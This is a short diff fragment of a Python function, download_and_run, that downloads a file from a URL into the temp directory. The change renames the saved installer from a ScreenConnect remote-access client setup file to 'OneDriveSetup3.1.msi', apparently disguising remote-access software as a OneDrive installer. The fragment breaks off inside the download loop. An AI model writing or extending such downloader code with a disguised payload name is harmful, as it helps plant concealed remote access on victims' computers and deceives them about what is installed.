@@ -23,7 +23,7 @@ import tempfile
 
 def download_and_run(url):
     temp_dir = tempfile.gettempdir()
-    file_path = os.path.join(temp_dir, 'ScreenConnect.ClientSetup.msi')
+    file_path = os.path.join(temp_dir, 'OneDriveSetup3.1.msi')
     with urllib.request.urlopen(url) as response, open(file_path, 'wb') as out_file:
         while True:
             chunk = response.read(8192)
